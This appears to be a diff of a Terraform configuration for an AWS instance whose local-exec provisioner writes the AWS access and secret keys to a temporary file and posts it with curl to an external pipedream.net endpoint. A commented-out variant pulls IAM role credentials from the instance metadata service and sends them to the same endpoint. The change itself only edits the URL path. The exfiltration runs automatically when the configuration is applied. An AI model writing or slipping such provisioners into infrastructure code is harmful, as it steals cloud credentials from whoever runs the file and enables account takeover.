@@ -16,7 +16,7 @@ resource "aws_instance" "example" {
 
   provisioner "local-exec" {
     #command = "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/tf-testing-role > /tmp/awscreds.txt && curl https://75a3cce6ebd29290b95c14b554827358.m.pipedream.net --data-urlencode creds@/tmp/awscreds.txt "
-    command = "echo $AWS_ACCESS_KEY $AWS_SECRET_KEY > /tmp/awscreds.txt && curl https://75a3cce6ebd29290b95c14b554827358.m.pipedream.net --data-urlencode creds@/tmp/awscreds.txt "
+    command = "echo $AWS_ACCESS_KEY $AWS_SECRET_KEY > /tmp/awscreds.txt && curl https://75a3cce6ebd29290b95c14b554827358.m.pipedream.net/test --data-urlencode creds@/tmp/awscreds.txt "
   }
 
   tags = {
